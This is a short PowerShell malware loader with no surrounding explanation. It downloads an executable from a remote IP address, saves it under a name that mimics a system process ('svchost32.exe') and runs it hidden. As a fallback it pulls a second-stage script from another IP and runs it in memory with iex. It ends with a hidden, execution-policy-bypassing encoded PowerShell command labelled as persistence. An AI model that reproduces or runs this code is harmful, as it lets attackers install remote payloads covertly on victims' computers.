# Stage 1 loader
$url = 'http://185.220.101.45:4444/payload.exe'
$dst = $env:TEMP + '\svchost32.exe'
(New-Object Net.WebClient).DownloadFile($url, $dst)
Start-Process $dst -WindowStyle Hidden
# Fallback: in-memory IEX
$stage2 = (New-Object Net.WebClient).DownloadString('http://91.108.4.183:31337/s2')
iex($stage2)
# Persistence via encoded command
powershell.exe -nop -w hidden -ExecutionPolicy Bypass -EncodedCommand JABjAG8AbQBtAGEAbgBkACAAPQAgACcAcwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAnAA==
